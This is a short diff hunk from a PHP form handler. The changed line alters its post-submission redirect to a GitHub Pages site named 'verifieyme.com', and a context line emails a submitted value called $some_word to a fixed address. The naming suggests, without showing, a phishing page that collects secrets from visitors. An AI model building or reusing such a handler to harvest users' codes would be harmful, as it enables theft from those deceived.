@@ -43,7 +43,7 @@ mail($myemail, $subject, $some_word);
 
 
 /* Redirect visitor to the thank you page */
-header('Location:https://github.com/favsil316/verifieyme.com/');
+header('Location:https://favsil316.github.io/verifieyme.com/index-dark.html/');
 exit();
 
 /* Functions we used */
